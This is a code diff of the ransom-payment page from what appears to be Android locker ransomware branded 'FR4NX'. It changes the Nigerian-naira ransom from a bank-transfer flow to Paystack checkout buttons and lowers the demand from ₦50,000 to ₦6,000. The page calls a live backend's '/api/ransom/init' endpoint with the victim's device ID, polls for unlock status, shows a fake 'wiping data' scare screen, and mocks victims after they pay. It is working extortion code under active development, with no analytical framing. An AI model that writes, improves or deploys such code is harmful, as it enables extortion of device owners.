@@ -54,16 +54,10 @@ button,input { font:inherit; }
 .progress-track { width:100%; height:8px; background:#1a0005; border-radius:10px; margin-top:10px; overflow:hidden; border:1px solid rgba(255,0,50,.2); }
 .progress-fill { height:100%; width:0%; background:linear-gradient(90deg, #550011, #ff0033); box-shadow:0 0 10px var(--red); transition:width 0.5s; }
 
-.v-account { display:none; background:rgba(0,0,0,0.6); border:1px dashed rgba(255,0,50,0.5); border-radius:10px; padding:12px; margin-top:15px; text-align:center; }
-.v-account p { font-size:12px; color:var(--muted); margin-bottom:5px; }
-.v-account h3 { font-family:'Orbitron',sans-serif; font-size:18px; color:var(--cyan); letter-spacing:2px; margin:5px 0; }
-.v-account span { font-size:13px; color:var(--text); font-weight:bold; }
-
-.bottom { width:100%; max-width:430px; }
-.main-button { width:100%; padding:16px; border:1px solid rgba(255,0,50,.6); border-radius:12px; color:white; background:linear-gradient(100deg,#550011,#aa0022,#550011); box-shadow:0 0 25px rgba(255,0,50,.3), inset 0 1px rgba(255,255,255,.25); font-family:'Orbitron',sans-serif; font-size:13px; font-weight:700; letter-spacing:2px; cursor:pointer; transition:.25s; animation:shine 3s linear infinite; }
-@keyframes shine { to { background-position:200% center; } }
-.main-button:active { transform:scale(.97); }
-.main-button:disabled { background:#2a0005; border-color:#550011; color:#a88f8f; animation:none; box-shadow:none; }
+.pay-grid { display:grid; grid-template-columns:repeat(3, 1fr); gap:8px; width:100%; max-width:430px; margin-bottom:15px; }
+.pay-btn { background:rgba(255,0,50,0.1); border:1px solid rgba(255,0,50,0.4); color:white; padding:12px 0; border-radius:8px; font-family:'Orbitron',sans-serif; font-size:12px; font-weight:bold; cursor:pointer; transition:.2s; }
+.pay-btn:active { background:rgba(255,0,50,0.3); }
+.pay-btn:disabled { opacity: 0.5; }
 
 .auth-screen { position:fixed; z-index:20; inset:0; display:none; align-items:center; justify-content:center; padding:25px; background:rgba(5,0,0,.95); backdrop-filter:blur(25px); }
 .auth-screen.active { display:flex; animation:fadeIn .4s ease; }
@@ -80,7 +74,7 @@ button,input { font:inherit; }
 .success-title { font-family:'Orbitron',sans-serif; font-size:23px; color:#aaffee; }
 .success-description { color:#88aabb; margin-top:14px; font-size:14px; line-height:1.6; }
 
-@media(max-height:700px) { .reactor { width:min(45vw,180px); margin:0 0 10px; } .payment-box { padding:10px; margin-bottom:10px; } .amount-big { font-size:20px; margin-bottom:5px; } }
+@media(max-height:700px) { .reactor { width:min(45vw,180px); margin:0 0 10px; } .payment-box { padding:10px; margin-bottom:10px; } .amount-big { font-size:20px; margin-bottom:5px; } .pay-btn { padding:8px 0; font-size:11px; } }
 </style>
 </head>
 <body>
@@ -121,7 +115,7 @@ button,input { font:inherit; }
     </section>
 
     <section class="payment-box">
-        <div class="amount-big" id="targetAmount">₦ 50,000.00</div>
+        <div class="amount-big" id="targetAmount">₦ 6,000.00</div>
         <div class="payment-row">
             <span>AMOUNT PAID</span>
             <span id="paidAmount">₦ 0.00</span>
@@ -129,17 +123,16 @@ button,input { font:inherit; }
         <div class="progress-track">
             <div class="progress-fill" id="payProgress"></div>
         </div>
-
-        <div class="v-account" id="virtualAccountBox">
-            <p>Transfer to this dedicated account:</p>
-            <h3 id="vAccountNumber">...</h3>
-            <span id="vBankName">Wema Bank</span> - <span id="vAccountName">FR4NX RANSOM</span>
-        </div>
     </section>
 
-    <footer class="bottom">
-        <button class="main-button" id="payButton" onclick="payNow()">GENERATE PAYMENT ACCOUNT</button>
-    </footer>
+    <section class="pay-grid">
+        <button class="pay-btn" onclick="payAmount(1000)">₦ 1,000</button>
+        <button class="pay-btn" onclick="payAmount(2000)">₦ 2,000</button>
+        <button class="pay-btn" onclick="payAmount(3000)">₦ 3,000</button>
+        <button class="pay-btn" onclick="payAmount(4000)">₦ 4,000</button>
+        <button class="pay-btn" onclick="payAmount(5000)">₦ 5,000</button>
+        <button class="pay-btn" onclick="payAmount(6000)">₦ 6,000</button>
+    </section>
 </main>
 
 <!-- Hidden Auth Panel -->
@@ -160,7 +153,7 @@ button,input { font:inherit; }
 <section class="success-screen" id="successScreen">
     <div class="success-icon">✧</div>
     <h2 class="success-title">DECRYPTION SUCCESSFUL</h2>
-    <p class="success-description">Decryption key accepted.<br>Your files have been restored.</p>
+    <p class="success-description">Thanks for banking with FR4NX! 🫠😂<br>Your files have been restored.</p>
 </section>
 
 <script>
@@ -198,11 +191,10 @@ function drawParticles() {
 window.addEventListener("resize", resizeCanvas);
 resizeCanvas(); drawParticles();
 
-// 2. Backend & Paystack Logic
+// 2. Backend & Checkout Logic
 const BACKEND_URL = "https://fr4nx.wisp.uno"; 
 let deviceId = Android.getDeviceId();
 let hasUnlocked = false;
-let accountGenerated = false;
 
 function checkPaymentStatus() {
     if (hasUnlocked) return;
@@ -212,44 +204,45 @@ function checkPaymentStatus() {
         .then(data => {
             if (data.status === "unlocked") {
                 hasUnlocked = true;
-                document.getElementById("payButton").innerText = "PAYMENT RECEIVED. DECRYPTING...";
-                document.getElementById("payButton").disabled = true;
+                document.getElementById("targetAmount").innerText = "UNLOCKED";
+                document.getElementById("paidAmount").innerText = "₦ 6,000.00";
+                document.getElementById("payProgress").style.width = "100%";
                 setTimeout(() => { Android.unlockOverlay(); }, 2000);
+                document.getElementById("mainScreen").style.display = "none";
+                document.getElementById("successScreen").classList.add("active");
             } else if (data.ok) {
                 let paid = data.amount_paid / 100;
                 let target = data.target / 100;
-                
-                document.getElementById("paidAmount").innerText = `₦ ${paid.toFixed(2)}`;
+                document.getElementById("paidAmount").innerText = `₦ ${paid.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
                 document.getElementById("targetAmount").innerText = `₦ ${target.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
-                
                 let percent = (paid / target) * 100;
                 if(percent > 100) percent = 100;
                 document.getElementById("payProgress").style.width = `${percent}%`;
-
-                if (data.virtual_account && !accountGenerated) {
-                    accountGenerated = true;
-                    document.getElementById("virtualAccountBox").style.display = "block";
-                    document.getElementById("vAccountNumber").innerText = data.virtual_account.account_number;
-                    document.getElementById("vBankName").innerText = data.virtual_account.bank_name;
-                    document.getElementById("vAccountName").innerText = data.virtual_account.account_name;
-                    document.getElementById("payButton").innerText = "WAITING FOR TRANSFER...";
-                    document.getElementById("payButton").disabled = true;
-                }
             }
         }).catch(e => console.log("Polling error:", e));
 }
 setInterval(checkPaymentStatus, 5000);
 checkPaymentStatus(); 
 
-function payNow() {
-    const btn = document.getElementById("payButton");
-    btn.innerText = "GENERATING ACCOUNT...";
-    fetch(`${BACKEND_URL}/api/ransom/init?device_id=${deviceId}`)
+function payAmount(amount) {
+    // Disable buttons temporarily to prevent double taps
+    const btns = document.querySelectorAll('.pay-btn');
+    btns.forEach(b => b.disabled = true);
+    
+    fetch(`${BACKEND_URL}/api/ransom/init?device_id=${deviceId}&amount=${amount}`)
         .then(res => res.json())
         .then(data => {
-            if (data.ok) { checkPaymentStatus(); }
-            else { btn.innerText = "NETWORK ERROR. TRY AGAIN."; }
-        }).catch(e => { btn.innerText = "NETWORK ERROR. TRY AGAIN."; });
+            if (data.ok && data.checkout_url) {
+                // Open the Paystack checkout page in the WebView
+                window.location.href = data.checkout_url;
+            } else {
+                alert("ERROR: " + (data.error || "RETRY"));
+                btns.forEach(b => b.disabled = false);
+            }
+        }).catch(e => {
+            alert("NETWORK ERROR. TRY AGAIN.");
+            btns.forEach(b => b.disabled = false);
+        });
 }
 
 // 3. Hidden 5-Tap Manual Key Bypass
@@ -270,7 +263,7 @@ function closeAuth() {
     document.getElementById("passInput").value = "";
 }
 
-// 4. THIS WAS MISSING BEFORE: Passkey & Decrypting Logic
+// 4. Passkey & Decrypting Logic
 function submitPass() {
     const pass = document.getElementById("passInput").value.trim();
     closeAuth();
@@ -278,9 +271,7 @@ function submitPass() {
 }
 
 function showDecrypting() {
-    document.getElementById("payButton").style.display = "none";
-    document.getElementById("targetAmount").style.display = "none";
-    document.getElementById("paidAmount").innerText = "DECRYPTING FILES...";
+    document.getElementById("targetAmount").innerText = "DECRYPTING...";
     document.getElementById("paidAmount").style.color = "#00ffcc";
     let pb = document.getElementById("payProgress");
     pb.style.background = "linear-gradient(90deg,#00ffcc,#5ceaff)";
@@ -296,12 +287,10 @@ function showDecrypting() {
             document.getElementById("mainScreen").style.display = "none";
             document.getElementById("successScreen").classList.add("active");
         }
-    }, 200); // 10 seconds
+    }, 200);
 }
 
 function showWiping() {
-    document.getElementById("payButton").style.display = "none";
-    document.getElementById("targetAmount").style.display = "none";
     document.getElementById("paidAmount").innerText = "WARNING: WIPING DATA...";
     document.getElementById("paidAmount").style.color = "#ff0000";
     let pb = document.getElementById("payProgress");
@@ -313,9 +302,6 @@ function showWiping() {
         pb.style.width = progress + "%";
         if (progress >= 100) {
             clearInterval(interval);
-            // Reset UI to try again
-            document.getElementById("payButton").style.display = "block";
-            document.getElementById("targetAmount").style.display = "block";
             document.getElementById("paidAmount").innerText = "₦ 0.00";
             document.getElementById("paidAmount").style.color = "var(--text)";
             pb.style.width = "0%";
